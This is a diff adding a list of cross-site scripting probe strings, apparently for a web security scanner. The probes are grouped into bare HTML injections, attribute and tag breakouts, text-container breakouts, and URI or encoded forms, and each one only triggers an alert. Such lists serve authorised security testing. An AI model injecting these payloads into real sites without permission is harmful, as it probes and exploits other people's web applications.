@@ -1,0 +1,36 @@
+# Cross-site scripting — reflected and context-breaking probes.
+# A fast-start set, not a wordlist manager; extend with a merge file for depth.
+# Blank lines and lines starting with '#' are comments (skipped at load).
+
+# Bare injections (an unencoded HTML sink)
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+
+# Breaking out of an attribute / tag
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+'"><svg/onload=alert(1)>
+"onmouseover="alert(1)
+'onmouseover='alert(1)
+" autofocus onfocus=alert(1) x="
+
+# Breaking out of a text container
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</script><script>alert(1)</script>
+
+# URI / encoded sinks
+javascript:alert(1)
+<a href=javascript:alert(1)>x</a>
+<script>alert(String.fromCharCode(88,83,83))</script>
+&lt;script&gt;alert(1)&lt;/script&gt;
+%3Cscript%3Ealert(1)%3C/script%3E
